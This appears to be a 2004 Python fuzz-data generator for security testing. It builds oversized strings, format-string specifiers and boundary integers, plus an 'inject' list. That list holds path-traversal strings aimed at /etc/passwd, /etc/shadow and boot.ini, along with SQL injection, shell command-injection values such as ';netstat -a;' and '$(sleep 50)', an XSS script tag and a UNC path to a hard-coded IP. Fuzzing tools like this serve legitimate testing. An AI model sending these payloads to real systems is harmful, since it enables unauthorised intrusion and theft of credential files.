#!/usr/bin/env python

"""
#  (C) COPYRIGHT SERGIO ALVAREZ
#  SECURITY RESEARCH & DEVELOPMENT, 2000-2004
#  Covered under GPL v 2.0
#
#  TITLE:       FUZZGENERATOR.PY
#
#  VERSION:     1.00
#
#  AUTHOR:      Sergio 'shadown' Alvarez
#
#  DATE:        31 AUG 2004
"""


import sys
import random

class fuzzgenerator:
	def __init__(self):
		self.ints = []
		self.strings = []
		self.injects = []
		self.generate()
		
	def addstring(self,data,datatype):
		if datatype == "string":
			self.strings.append(data)
		elif datatype == "inject":
			self.injects.append(data)
		elif datatype == "int":
			self.ints.append(data)
		else:
			print "Unknown datatype"
	
	def genfuzzdata(self,string,tosize,increment,datatype="string",fromsize=0):
		if fromsize:
			x = fromsize
		else:
			x = increment
		while x < tosize:
			y = string * x
			y = y.replace("\x0a","")
			self.addstring(y,datatype)
			x += increment

	def generate(self):
		self.genfuzzdata("A",10240,1024)
		self.genfuzzdata("B",10240,1024)
		self.genfuzzdata("%s",64,8)
		self.genfuzzdata("\x00A\x00",256,8)
		self.genfuzzdata("/",10240,128)
		self.genfuzzdata(">",10240,128)
		self.genfuzzdata("<",10240,128)
		self.genfuzzdata("%",10240,128)
		self.genfuzzdata("+",10240,128)
		self.genfuzzdata("-",10240,128)
		self.genfuzzdata(",",10240,128)
		self.genfuzzdata(".",10240,128)
		self.genfuzzdata(":",10240,128)
		self.genfuzzdata("?",10240,128)
		self.genfuzzdata("9",10240,128,"int")
		self.genfuzzdata("%u000",128,8)
		self.genfuzzdata("\r",6144,32)
		self.genfuzzdata("\n",6144,32)
		self.genfuzzdata("A:",6144,32)
		self.genfuzzdata("/\\",6144,32)
		self.genfuzzdata("\r\n",6144,16)
		self.genfuzzdata("0",32,2,"int")
		self.genfuzzdata("2",32,2,"int")
		self.genfuzzdata("9",32,2,"int")
		self.genfuzzdata("~{",256,8)
		self.genfuzzdata("../A/",2048,32)
		self.genfuzzdata("%0a",2048,8)
		self.genfuzzdata("../",2048,32)
		self.genfuzzdata("/.../",2048,64)
		self.genfuzzdata(":/.",4096,32)
		self.addstring("ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|","string")
		self.addstring("../../../../../../../../../../../../etc/hosts%00","inject")
		self.addstring("../../../../../../../../../../../../etc/hosts","inject")
		self.addstring("../../../../../../../../../../../../etc/passwd%00","inject")
		self.addstring("../../../../../../../../../../../../etc/passwd","inject")
		self.addstring("../../../../../../../../../../../../etc/shadow%00","inject")
		self.addstring("../../../../../../../../../../../../etc/shadow","inject")
		self.addstring("../../../../../../../../../../../../boot.ini%00","inject")
		self.addstring("../../../../../../../../../../../../boot.ini","inject")
		self.addstring("../../../../../../../../../../../../localstart.asp%00","inject")
		self.addstring("../../../../../../../../../../../../localstart.asp","inject")
		self.addstring("%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00","inject")
		self.addstring("%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini","inject")
		self.addstring("/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00","inject")
		self.addstring("/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini","inject")
		self.addstring("65536","int")
		self.addstring("0xfffffff","int")
		self.addstring("268435455","int")
		self.addstring("1","int")
		self.addstring("0","int")
		self.addstring("-1","int")
		self.addstring("-268435455","int")
		self.addstring("-20","int")
		self.addstring("1;SELECT%20*","inject")
		self.addstring("'sqlattempt1","inject")
		self.addstring("(sqlattempt2)","inject")
		self.addstring("OR%201=1","inject")
		self.addstring(";read;","inject")
		self.addstring(";netstat -a;","inject")
		self.addstring("\\","string")
		self.addstring("%5c","string")
		self.addstring("\\/","string")
		self.addstring("%5c/","string")
		self.addstring("\nnetstat -a%\n","inject")
		self.addstring("\"hihihi","inject") 
		self.addstring("|dir|","inject")
		self.addstring("|ls","inject")
		self.addstring("|/bin/ls -al","inject")
		self.addstring("\n/bin/ls -al\n","inject")
		self.addstring("+%00","inject")
		self.addstring("%20$(sleep%2050)","inject")
		self.addstring("%20'sleep%2050'","inject")
		self.addstring("!@#$%%^#$%#$@#$%$$@#$%^^**(()","string")
		self.addstring("%01%02%03%04%0a%0d%0aADSF","string")
		self.addstring("<xss><script>alert('XSS')</script></vulnerable>","inject")
		self.addstring("\\\\*","string")
		self.addstring("\\\\?\\","string")
		self.addstring("/.../.../.../.../.../","inject")
		self.addstring("\\\\24.3.19.135\\C$\\asdf","inject")

	def getstrings(self):
		return self.strings

	def getinjects(self):
		return self.injects

	def getints(self):
		return self.ints

	def showstrings(self):
		for string in self.strings:
			print string

	def showinjects(self):
		for inject in self.injects:
			print inject

	def showintegers(self):
		for integer in self.ints:
			print integer

	def showall(self):
		self.showstrings()
		self.showintegers()
		self.showinjects()

if __name__ == '__main__':
	f = fuzzgenerator()
	f.showall()
